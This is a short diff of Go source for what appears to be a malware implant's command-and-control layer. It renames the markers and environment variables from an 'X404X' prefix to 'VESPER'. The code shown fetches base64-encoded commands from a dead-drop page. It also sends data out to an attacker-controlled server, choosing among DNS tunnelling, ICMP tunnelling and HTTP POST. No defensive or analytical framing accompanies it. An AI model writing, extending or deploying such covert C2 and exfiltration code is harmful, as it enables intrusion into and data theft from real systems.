@@ -190,8 +190,8 @@ func DeadDrop(ctx context.Context, dropURL string, interval time.Duration) (<-ch
 		defer ticker.Stop()
 
 		// Markers that wrap base64-encoded commands in the dead drop content
-		markerStart := "<!--X404X_CMD-->"
-		markerEnd := "<!--/X404X_CMD-->"
+		markerStart := "<!--VESPER_CMD-->"
+		markerEnd := "<!--/VESPER_CMD-->"
 
 		for {
 			select {
@@ -269,14 +269,14 @@ func PolymorphicC2(ctx context.Context, data []byte) ([]byte, error) {
 		execute func(context.Context, []byte) ([]byte, error)
 	}{
 		{"dns", 30, func(ctx context.Context, d []byte) ([]byte, error) {
-			return DNSTunnel(ctx, d, os.Getenv("X404X_C2_DOMAIN"))
+			return DNSTunnel(ctx, d, os.Getenv("VESPER_C2_DOMAIN"))
 		}},
 		{"icmp", 20, func(ctx context.Context, d []byte) ([]byte, error) {
-			return ICMPTunnel(ctx, d, os.Getenv("X404X_C2_IP"))
+			return ICMPTunnel(ctx, d, os.Getenv("VESPER_C2_IP"))
 		}},
 		{"http", 50, func(ctx context.Context, d []byte) ([]byte, error) {
 			client := &http.Client{Timeout: 10 * time.Second}
-			req, _ := http.NewRequestWithContext(ctx, "POST", os.Getenv("X404X_C2_URL"), strings.NewReader(base64.StdEncoding.EncodeToString(d)))
+			req, _ := http.NewRequestWithContext(ctx, "POST", os.Getenv("VESPER_C2_URL"), strings.NewReader(base64.StdEncoding.EncodeToString(d)))
 			resp, err := client.Do(req)
 			if err != nil {
 				return nil, err
